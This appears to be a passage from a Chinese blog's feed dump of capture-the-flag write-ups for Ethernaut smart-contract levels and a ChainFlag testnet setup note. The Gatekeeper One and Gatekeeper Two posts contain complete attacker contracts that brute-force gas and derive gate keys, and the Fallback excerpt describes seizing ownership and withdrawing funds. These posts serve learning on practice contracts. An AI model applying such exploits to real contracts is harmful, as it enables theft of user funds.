class="token punctuation">;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>在 <code>receive()</code> 中存在对所有者的修改，然后成为所有者后再执行 <code>withdraw()</code> 即可提取出所有资金</p><p><img src="/../../../../pic/Pasted%20image%2020221118005800.png"></p><p>先使用 <code>contribute()</code> 转入一点资金方便后续调用 <code>receive()</code></p><p><img src="/../../../../pic/Pasted%20image%2020221118005927.png"></p><p>转入后查看一下，已经将我们的地址存了进去</p><p>这下满足了 <code>receive()</code> 中的 <code>require</code></p><p>直接使用 <code>Transact</code> 进行交易触发 <code>receive()</code></p><p><img src="/../../../../pic/Pasted%20image%2020221118010152.png"></p><p>交易之后再检查 <code>owner</code> 已经变成了我们的形状</p><p>然后执行 <code>withdraw()</code> 把所有资金取出来即可</p><p>最后回到题目上提交示例检查</p><p><img src="/../../../../pic/Pasted%20image%2020221118010354.png"></p><p><a href="http://www.snowywar.top/?p=3848">http://www.snowywar.top/?p=3848</a></p><p><a href="https://xz.aliyun.com/t/11059">https://xz.aliyun.com/t/11059</a></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChainFlag - 须知</title>
      <link href="/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-xu-zhi/"/>
      <url>/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-xu-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="ChainFlag-须知"><a href="#ChainFlag-须知" class="headerlink" title="ChainFlag - 须知"></a>ChainFlag - 须知</h1><p>目前 ChainFlag 部署在 Sepolia 测试网络上，因此需要加入到 Sepolia 测试网络当中</p><p>如下加入即可</p><pre class="line-numbers language-none"><code class="language-none">Sepolia 测试网络https://rpc-sepolia.rockx.com11155111SEPhttps://sepolia.otterscan.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221105185512.png"></p><p>还需要水龙头获取测试数字货币</p><p><a href="https://faucet.sepolia.dev/">https://faucet.sepolia.dev/</a></p><p><a href="https://sepoliafaucet.net/">https://sepoliafaucet.net/</a></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChainFlag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Gatekeeper One</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-gatekeeper-one/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-gatekeeper-one/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Gatekeeper-One"><a href="#Ethernaut-Gatekeeper-One" class="headerlink" title="Ethernaut - Gatekeeper One"></a>Ethernaut - Gatekeeper One</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>越过守门人并且注册为一个参赛者来完成这一关.</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">GatekeeperOne</span> <span class="token punctuation">{</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>  <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">gasleft</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8191</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>要想执行 <code>enter</code> 需要绕过三个 <code>modifier </code></p><p>第一个 </p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>很容易绕过，通过合约调用即可</p><p>第二个</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">gasleft</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8191</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>要想绕过需要剩余的 <code>gas</code> 值为 <code>8191</code> 的倍数</p><p>这需要爆破一下</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">120</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>targetContract<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>gas<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">150</span> <span class="token operator">+</span> <span class="token number">8191</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"enter(bytes8)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三个</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GatekeeperOne: invalid gateThree part three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本质是类型转换，从高位转成低位时，会造成截断和丢失</p><p>从第一个开始，uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</p><p>要满足这个，低位的二字节必须等于低位的4字节，所以说要删除四字节中的高位的两个字节，相当于让 0x111111 等于 0x00001111 ,此时掩码为 0x0000FFFF</p><p>第二个需求是低位8字节必须与低位的4字节有所不同，满足第一个条件是，必须是0x00000000001111 !=0xXXXXXX00001111</p><p>此时掩码为0xFFFFFFFF0000FFFF</p><p>那么第三个掩码应用于 tx.origin ，并将其转换为 bytes8 ，此时</p><p>最终结果bytes8 _gateKey = bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF;</p><p>攻击合约</p><pre><code class="sol">// SPDX-License-Identifier: UNLICENSEpragma solidity ^0.8.0;interface GatekeeperOne {}contract Hacker {  GatekeeperOne public targetContract;  event Log(bool, bytes);  bytes8 public data = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;  constructor(address _address) {    targetContract = GatekeeperOne(_address);  }  function exploit() public {    for(uint256 i = 0; i &lt; 120; i++){      (bool success,bytes memory callData) = address(targetContract).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",data));      emit Log(success, callData);    }  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Hello Ethernaut</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-hello-ethernaut/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-hello-ethernaut/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Hello-Ethernaut"><a href="#Ethernaut-Hello-Ethernaut" class="headerlink" title="Ethernaut - Hello Ethernaut"></a>Ethernaut - Hello Ethernaut</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>在合约中找到一些需要的东西</li></ol><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>点击最下面的按钮生成一个新的实例</p><p>调用成功后根据题目提示查看一下合约中的 abi</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">contract<span class="token punctuation">.</span>abi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221118003717.png"></p><p>存在很多可调用的方法，没有源码情况下只能一个一个进行尝试调用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'You will find what you need in info1().'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得提示去调用 <code>info1()</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">info1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'Try info2(), but with "hello" as a parameter.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>调用 <code>info2()</code> 的时候需要带上参数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">info2</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token comment">// 'The property infoNum holds the number of the next info method to call.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>去调用 <code>infoNum()</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">infoNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> v<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// '42'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>继续调用 <code>info42()</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">info42</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'theMethodName is the name of the next method.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样的往下调用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">theMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'The method name is method7123949.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>继续！俄罗斯套娃都没有你能套！</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">method7123949</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'If you know the password, submit it to authenticate().</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进入最后一步了，先获取 <code>password</code> 的值然后作为参数提交给 <code>authenticate()</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 'ethernaut0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后提交</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token string">"ethernaut0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221118005010.png"></p><p>交易完成之后提交该示例</p><p>检测完成后</p><p><img src="/../../../../pic/Pasted%20image%2020221118005116.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要考察的是函数的调用以及平台的基本使用很简单</p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Gatekeeper Two</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-gatekeeper-two/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-gatekeeper-two/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Gatekeeper-Two"><a href="#Ethernaut-Gatekeeper-Two" class="headerlink" title="Ethernaut - Gatekeeper Two"></a>Ethernaut - Gatekeeper Two</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">GatekeeperTwo</span> <span class="token punctuation">{</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>  <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin">uint</span> x<span class="token punctuation">;</span>    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p>依旧是绕过 <code>modifier</code></p><p>第一个就不看了，看第二个</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token builtin">uint</span> x<span class="token punctuation">;</span>  <span class="token keyword">assembly</span> <span class="token punctuation">{</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>  <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>assembly</code> 为内嵌汇编</p><p>主要目的是要求caller的code大小必须为0，</p><p>当构造函数执行初始化合约存储时，它会返回运行时字节码。直到构造函数的结束，合约本身没有任何运行时字节码，这意味着如果你此时调用address(contract).code.length，它将返回0</p><p>再看第三个</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用异或判断，要求异或后的值为 <code>uint64</code> 类型的最大值</p><p>基于异或运算的特性 <code>x ^ y ^ x = y</code></p><p>所以 _gateKey 的值为</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编写攻击合约</p><pre><code class="sol">// SPDX-License-Identifier: UNLICENSEpragma solidity ^0.8.0;interface GatekeeperTwo {  function enter(bytes8 _gateKey) external returns (bool);}contract Hacker {  constructor(address _address) {    GatekeeperTwo targetContract = GatekeeperTwo(_address);    bytes8 data = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);    targetContract.enter(data);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Privacy</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-privacy/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-privacy/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Privacy"><a href="#Ethernaut-Privacy" class="headerlink" title="Ethernaut - Privacy"></a>Ethernaut - Privacy</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>这个合约的制作者非常小心的保护了敏感区域的 storage.</li><li>解开这个合约来完成这一关.</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Privacy</span> <span class="token punctuation">{</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>  <span class="token builtin">uint16</span> <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token 